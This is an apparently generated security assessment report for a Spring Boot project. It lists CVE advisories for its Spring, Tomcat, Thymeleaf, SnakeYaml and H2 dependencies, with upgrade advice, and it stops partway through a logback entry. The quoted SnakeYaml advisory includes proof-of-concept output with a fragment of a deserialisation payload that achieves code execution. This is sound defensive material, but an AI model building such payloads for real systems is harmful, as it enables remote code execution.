# Security Assessment Report

**Generated:** 2026-10-07T14:23:27.008862Z

## Scope and limitations

- CVE lookup covered 101 resolved Maven dependencies: 11 direct and 90 transitive, including test dependencies. All four advisory batches and pagination completed with zero final lookup failures.
- Minimum CVE severity: **low**. Dependency advisories are version matches, not proof that every advisory is reachable or exploitable in this application.
- All 59 requested CWE rules were assessed sequentially through static source review. No runtime exploit tests were performed. NOT_FOUND means no confirmed match in the inspected scope, not a guarantee of absence; individual result files retain review caveats.
- This is an assessment only; findings have not been remediated.

## Summary

| Metric | Count |
|--------|-------|
| Total Findings | 120 |
| CVE Vulnerabilities | 119 |
| CWE Vulnerabilities | 1 |
| Total Rules Assessed | 59 |
| Rules Passed (no confirmed match) | 58 |

### By Severity

| Severity | Count |
|----------|-------|
| mandatory | 60 |
| optional | 44 |
| potential | 16 |

## CVE Findings (Dependency Vulnerabilities)

### CVE-2016-1000027: Pivotal Spring Framework contains unsafe Java deserialization methods
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2016-1000027](https://github.com/advisories/GHSA-4wrc-f8pq-fpqp): Pivotal Spring Framework contains unsafe Java deserialization methods

GHSA: GHSA-4wrc-f8pq-fpqp
Severity: CRITICAL

Pivotal Spring Framework before 6.0.0 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required.

Maintainers recommend investigating alternative components or a potential mitigating control. Version 4.2.6 and 3.2.17 contain [enhanced documentation](https://github.com/spring-projects/spring-framework/commit/5cbe90b2cd91b866a5a9586e460f311860e11cfa) advising users to take precautions against unsafe Java deserialization, version 5.3.0 [deprecate the impacted classes](https://github.com/spring-projects/spring-framework/issues/25379) and version 6.0.0 [removed it entirely](https://github.com/spring-projects/spring-framework/issues/27422).

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-web:5.3.31; affected range: < 6.0.0
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-web:5.3.31

Recommended fix:
  - org.springframework:spring-web: upgrade to 6.0.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2024-38821: Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2024-38821](https://github.com/advisories/GHSA-c4q5-6c82-3qpw): Spring Security vulnerable to Authorization Bypass of Static Resources in WebFlux Applications

GHSA: GHSA-c4q5-6c82-3qpw
Severity: CRITICAL

Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.

For this to impact an application, all of the following must be true:

  *  It must be a WebFlux application
  *  It must be using Spring's static resources support
  *  It must have a non-permitAll authorization rule applied to the static resources support

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-web:5.7.11; affected range: >= 5.0.0, < 5.7.13
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-web:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-web: upgrade to 5.7.13 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2025-24813: Apache Tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2025-24813](https://github.com/advisories/GHSA-83qj-6fr2-vhqg): Apache Tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT

GHSA: GHSA-83qj-6fr2-vhqg
Severity: CRITICAL

Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98. The following versions were EOL at the time the CVE was created but are known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.

If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads
- attacker knowledge of the names of security sensitive files being uploaded
- the security sensitive files also being uploaded via partial PUT

If all of the following were true, a malicious user was able to perform remote code execution:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- application was using Tomcat's file based session persistence with the default storage location
- application included a library that may be leveraged in a deserialization attack

Users are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.99, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.99
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.99 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-22732: Spring Security HTTP Headers Are not Written Under Some Conditions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:63

[CVE-2026-22732](https://github.com/advisories/GHSA-mf92-479x-3373): Spring Security HTTP Headers Are not Written Under Some Conditions

GHSA: GHSA-mf92-479x-3373
Severity: CRITICAL

When applications specify HTTP response headers for servlet applications using Spring Security, there is the possibility that the HTTP Headers will not be written. 
This issue affects Spring Security: from 5.7.0 through 5.7.21, from 5.8.0 through 5.8.23, from 6.3.0 through 6.3.14, from 6.4.0 through 6.4.14, from 6.5.0 through 6.5.8, from 7.0.0 through 7.0.3.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework.security:spring-security-web:5.7.11; affected range: <= 5.7.14
    - Transitive; pulled by direct root declared at pom.xml:63; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-security:2.7.18 -> org.springframework.security:spring-security-web:5.7.11

Recommended fix:
  - org.springframework.security:spring-security-web: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-40477: Improper restriction of the scope of accessible objects in Thymeleaf expressions
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:38

[CVE-2026-40477](https://github.com/advisories/GHSA-r4v4-5mwr-2fwr): Improper restriction of the scope of accessible objects in Thymeleaf expressions

GHSA: GHSA-r4v4-5mwr-2fwr
Severity: CRITICAL

### Impact
A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.3.RELEASE. Although the library provides mechanisms to prevent expression injection, it fails to properly restrict the scope of accessible objects, allowing specific potentially sensitive objects to be reached from within a template. If an application developer passes unvalidated user input directly to the template engine, an unauthenticated remote attacker can bypass the library's protections to achieve Server-Side Template Injection (SSTI).

### Patches
This has been fixed in Thymeleaf 3.1.4.RELEASE.

### Workarounds
No workaround is available beyond ensuring applications do not pass unvalidated user input directly to the template engine. Upgrading to 3.1.4.RELEASE is strongly recommended in any case.


### Credits
Thanks to Thomas Reburn (Praetorian) for responsible disclosure.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.thymeleaf:thymeleaf:3.0.15.RELEASE; affected range: <= 3.1.3.RELEASE
    - Transitive; pulled by direct root declared at pom.xml:38; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18 -> org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE -> org.thymeleaf:thymeleaf:3.0.15.RELEASE
  - org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE; affected range: <= 3.1.3.RELEASE
    - Transitive; pulled by direct root declared at pom.xml:38; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18 -> org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE

Recommended fix:
  - org.thymeleaf:thymeleaf: upgrade to 3.1.4.RELEASE or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.
  - org.thymeleaf:thymeleaf-spring5: upgrade to 3.1.4.RELEASE or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-40478: Improper neutralization of specific syntax patterns for unauthorized expressions in Thymeleaf
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:38

[CVE-2026-40478](https://github.com/advisories/GHSA-xjw8-8c5c-9r79): Improper neutralization of specific syntax patterns for unauthorized expressions in Thymeleaf

GHSA: GHSA-xjw8-8c5c-9r79
Severity: CRITICAL

### Impact
A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.3.RELEASE. Although the library provides mechanisms to prevent expression injection, it fails to properly neutralize specific syntax patterns that allow for the execution of unauthorized expressions. If an application developer passes unvalidated user input directly to the template engine, an unauthenticated remote attacker can bypass the library's protections to achieve Server-Side Template Injection (SSTI).

### Patches
This has been fixed in Thymeleaf 3.1.4.RELEASE.

### Workarounds
No workaround is available beyond ensuring applications do not pass unvalidated user input directly to the template engine. Upgrading to 3.1.4.RELEASE is strongly recommended in any case.

### Credits
Thanks to Dawid Bakaj (VIPentest.com) for responsible disclosure.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.thymeleaf:thymeleaf:3.0.15.RELEASE; affected range: <= 3.1.3.RELEASE
    - Transitive; pulled by direct root declared at pom.xml:38; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18 -> org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE -> org.thymeleaf:thymeleaf:3.0.15.RELEASE
  - org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE; affected range: <= 3.1.3.RELEASE
    - Transitive; pulled by direct root declared at pom.xml:38; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18 -> org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE

Recommended fix:
  - org.thymeleaf:thymeleaf: upgrade to 3.1.4.RELEASE or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.
  - org.thymeleaf:thymeleaf-spring5: upgrade to 3.1.4.RELEASE or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-41293: Apache Tomcat - HTTP/2 request headers not validated
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-41293](https://github.com/advisories/GHSA-r29c-68gh-xp6x): Apache Tomcat - HTTP/2 request headers not validated

GHSA: GHSA-r29c-68gh-xp6x
Severity: CRITICAL

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
HTTP/2 request headers were not validated which may have triggered
unexpected application behaviour if the application (quite reasonably)
assumed that header value exposed through the Servlet API would be
specification compliant.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Credit:
This issue was identified by Dawit Jeong (@dawitngoliath)

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 8.5.0, < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-41901: Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:38

[CVE-2026-41901](https://github.com/advisories/GHSA-c9ph-gxww-7744): Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns

GHSA: GHSA-c9ph-gxww-7744
Severity: CRITICAL

### Impact

A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.4.RELEASE. Although the library provides mechanisms to avoid the execution of potentially dangerous expressions in some specific sandboxed (restricted) contexts, it fails to properly neutralize specific constructs that allow this kind of expressions to be executed. If an application developer passes to the template engine unsanitized variables that contain such expressions, and these values are used in sandboxed contexts inside the templates, these expressions can be executed achieving Server-Side Template Injection (SSTI).

### Patches

This has been fixed in Thymeleaf 3.1.5.RELEASE. All users are advised to upgrade immediately.

### Workarounds

No workaround is available beyond ensuring applications do not pass unvalidated/unsanitized data directly to the template engine. Upgrading to 3.1.5.RELEASE is strongly recommended in any case.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.thymeleaf:thymeleaf:3.0.15.RELEASE; affected range: <= 3.1.4.RELEASE
    - Transitive; pulled by direct root declared at pom.xml:38; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18 -> org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE -> org.thymeleaf:thymeleaf:3.0.15.RELEASE
  - org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE; affected range: <= 3.1.4.RELEASE
    - Transitive; pulled by direct root declared at pom.xml:38; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18 -> org.thymeleaf:thymeleaf-spring5:3.0.15.RELEASE

Recommended fix:
  - org.thymeleaf:thymeleaf: upgrade to 3.1.5.RELEASE or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.
  - org.thymeleaf:thymeleaf-spring5: upgrade to 3.1.5.RELEASE or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-43512: Apache Tomcat - Digest authenticator will authenticate any unknown user
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-43512](https://github.com/advisories/GHSA-h6fc-48rj-7qqh): Apache Tomcat - Digest authenticator will authenticate any unknown user

GHSA: GHSA-h6fc-48rj-7qqh
Severity: CRITICAL

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
When DIGEST authentication was configured, any user not known to the
configured Realm would be authenticated if they presented the password
"null".

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-43515: Apache Tomcat - Security constraints not correctly applied
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-43515](https://github.com/advisories/GHSA-5m62-pw8w-7w9f): Apache Tomcat - Security constraints not correctly applied

GHSA: GHSA-5m62-pw8w-7w9f
Severity: CRITICAL

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.21
Apache Tomcat 10.1.0-M1 to 10.1.54
Apache Tomcat 9.0.0.M1 to 9.0.117
Older, unsupported versions may also be affected

Description:
When multiple security constraints defined an HTTP method constraint for
the same extension pattern, only the first method constraint was applied.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.22 or later
- Upgrade to Apache Tomcat 10.1.55 or later
- Upgrade to Apache Tomcat 9.0.118 or later

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: < 9.0.118
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.118 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-47884: Spring Framework Improper Path Limitation in XsltView
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-47884](https://github.com/advisories/GHSA-pc63-qcmh-9cmg): Spring Framework Improper Path Limitation in XsltView

GHSA: GHSA-pc63-qcmh-9cmg
Severity: CRITICAL

Use of XsltView in a Spring MVC application can result in SSRF and RCE attack if the application has an "/**" mapping that results in view rendering, and where the view name is not explicitly specified.
Spring Framework 7.0.0 - 7.0.8
Spring Framework 6.2.0 - 6.2.19
Spring Framework 6.1.0 - 6.1.28
Spring Framework 6.0.0 - 6.0.30
Spring Framework 5.3.0 - 5.3.49
Spring Framework 5.2.25.RELEASE and earlier

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.springframework:spring-webmvc:5.3.31; affected range: >= 5.3.0, <= 5.3.49
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework:spring-webmvc:5.3.31

Recommended fix:
  - org.springframework:spring-webmvc: no first patched version provided; consult the advisory for mitigation or an unaffected supported release.

### CVE-2026-65182: Apache Tomcat has an Improper Access Control, Incorrect Authorization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-65182](https://github.com/advisories/GHSA-gcx9-497g-6cp6): Apache Tomcat has an Improper Access Control, Incorrect Authorization vulnerability

GHSA: GHSA-gcx9-497g-6cp6
Severity: CRITICAL

Improper Access Control, Incorrect Authorization vulnerability in Apache Tomcat leads to security constraint bypass if a constraint for a longer path is specified before a more restrictive constraint for a shorter sub-path.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.

Users are recommended to upgrade to version 11.0.25, 10.1.58, 9.0.121, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0-M1, < 9.0.121
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.121 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-65905: Apache Tomcat's DIGEST authenticator has an Authentication Bypass by Capture-replay vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-65905](https://github.com/advisories/GHSA-9xv2-5v5q-p794): Apache Tomcat's DIGEST authenticator has an Authentication Bypass by Capture-replay vulnerability

GHSA: GHSA-9xv2-5v5q-p794
Severity: CRITICAL

Authentication Bypass by Capture-replay vulnerability in Apache Tomcat's DIGEST authenticator. If, before windowSize requests have been made, a client makes a DIGEST authenticated request with a nonceCount on the upper boundary of the replay window then that request is replayable once only while the associated nonceCount remains within the replay window.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120.

The following versions were EOL at the time the CVE was created but are known to be affected: from 8.5.0 through 8.5.100, from 7.0.30 through 7.0.109. Other unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.25, 10.1.58 or 9.0.121, which fix the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0.M1, < 9.0.121
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.121 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-68525: Apache Tomcat's FORM authentication process has an Incorrect Authorization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2026-68525](https://github.com/advisories/GHSA-h3x4-894j-xpx5): Apache Tomcat's FORM authentication process has an Incorrect Authorization vulnerability

GHSA: GHSA-h3x4-894j-xpx5
Severity: CRITICAL

Incorrect Authorization vulnerability in Apache Tomcat's FORM authentication process allows the bypassing of a security constraint that limits user has access to a resource POST but not GET.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.24, from 10.1.0-M1 through 10.1.57, from 9.0.0.M1 through 9.0.120.

The following versions were EOL at the time the CVE was created but are known to be affected: from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109. Other unsupported versions may also be affected.

Users are recommended to upgrade to version 11.0.25, 10.1.58 or 9.0.121, which fixes the issue.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.apache.tomcat.embed:tomcat-embed-core:9.0.83; affected range: >= 9.0.0-M1, < 9.0.121
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter-tomcat:2.7.18 -> org.apache.tomcat.embed:tomcat-embed-core:9.0.83

Recommended fix:
  - org.apache.tomcat.embed:tomcat-embed-core: upgrade to 9.0.121 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-1471: SnakeYaml Constructor Deserialization Remote Code Execution
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-1471](https://github.com/advisories/GHSA-mjmj-j48q-9wg2): SnakeYaml Constructor Deserialization Remote Code Execution

GHSA: GHSA-mjmj-j48q-9wg2
Severity: HIGH

### Summary
SnakeYaml's `Constructor` class, which inherits from `SafeConstructor`, allows
any type be deserialized given the following line:

new Yaml(new Constructor(TestDataClass.class)).load(yamlContent);

Types do not have to match the types of properties in the
target class. A `ConstructorException` is thrown, but only after a malicious
payload is deserialized.

### Severity
High, lack of type checks during deserialization allows remote code execution.

### Proof of Concept
Execute `bash run.sh`. The PoC uses Constructor to deserialize a payload
for RCE. RCE is demonstrated by using a payload which performs a http request to
http://127.0.0.1:8000.

Example output of successful run of proof of concept:

```
$ bash run.sh

[+] Downloading snakeyaml if needed
[+] Starting mock HTTP server on 127.0.0.1:8000 to demonstrate RCE
nc: no process found
[+] Compiling and running Proof of Concept, which a payload that sends a HTTP request to mock web server.
[+] An exception is expected.
Exception:
Cannot create property=payload for JavaBean=Main$TestDataClass@3cbbc1e0
 in 'string', line 1, column 1:
    payload: !!javax.script.ScriptEn ... 
    ^
Can not set java.lang.String field Main$TestDataClass.payload to javax.script.ScriptEngineManager
 in 'string', line 1, column 10:
    payload: !!javax.script.ScriptEngineManag ... 
             ^

	at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:291)
	at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.construct(Constructor.java:172)
	at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:332)
	at org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:230)
	at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:220)
	at org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:174)
	at org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:158)
	at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:491)
	at org.yaml.snakeyaml.Yaml.load(Yaml.java:416)
	at Main.main(Main.java:37)
Caused by: java.lang.IllegalArgumentException: Can not set java.lang.String field Main$TestDataClass.payload to javax.script.ScriptEngineManager
	at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)
	at java.base/jdk.internal.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)
	at java.base/jdk.internal.reflect.UnsafeObjectFieldAccessorImpl.set(UnsafeObjectFieldAccessorImpl.java:81)
	at java.base/java.lang.reflect.Field.set(Field.java:780)
	at org.yaml.snakeyaml.introspector.FieldProperty.set(FieldProperty.java:44)
	at org.yaml.snakeyaml.constructor.Constructor$ConstructMapping.constructJavaBean2ndStep(Constructor.java:286)
	... 9 more
[+] Dumping Received HTTP Request. Will not be empty if PoC worked
GET /proof-of-concept HTTP/1.1
User-Agent: Java/11.0.14
Host: localhost:8000
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

### Further Analysis
Potential mitigations include, leveraging SnakeYaml's SafeConstructor while parsing untrusted content.

See https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479 for discussion on the subject.

### Timeline
**Date reported**: 4/11/2022
**Date fixed**:  [30/12/2022](https://bitbucket.org/snakeyaml/snakeyaml/pull-requests/44)
**Date disclosed**: 10/13/2022

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: <= 1.33
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 2.0 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-25857: Uncontrolled Resource Consumption in snakeyaml
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-25857](https://github.com/advisories/GHSA-3mc7-4q67-w48m): Uncontrolled Resource Consumption in snakeyaml

GHSA: GHSA-3mc7-4q67-w48m
Severity: HIGH

The package org.yaml:snakeyaml from 0 and before 1.31 are vulnerable to Denial of Service (DoS) due missing to nested depth limitation for collections.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: < 1.31
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 1.31 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-45868: Password exposure in H2 Database 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:89

[CVE-2022-45868](https://github.com/advisories/GHSA-22wj-vf5f-wrvj): Password exposure in H2 Database 

GHSA: GHSA-22wj-vf5f-wrvj
Severity: HIGH

The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states "This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that."

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.h2database:h2:2.1.214; affected range: >= 1.4.198, < 2.2.220
    - Direct declaration at pom.xml:89; scope: test; full resolved chain: com.h2database:h2:2.1.214

Recommended fix:
  - com.h2database:h2: upgrade to 2.2.220 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2023-6378: logback serialization vulnerability
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2023-6378](https://github.com/advisories/GHSA-vmq6-5m68-f53m): logback serialization vulnerability

GHSA: GHSA-vmq6-5m68-f53m
Severity: HIGH

A serialization vulnerability in logback receiver component part of logback allows an attacker to mount a Denial-Of-Service attack by sending poisoned data.

This is only exploitable if logback receiver component is deployed. See https://logback.qos.ch/manual/receivers.html

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - ch.qos.logback:logback-core:1.2.12; affected range: < 1.2.13
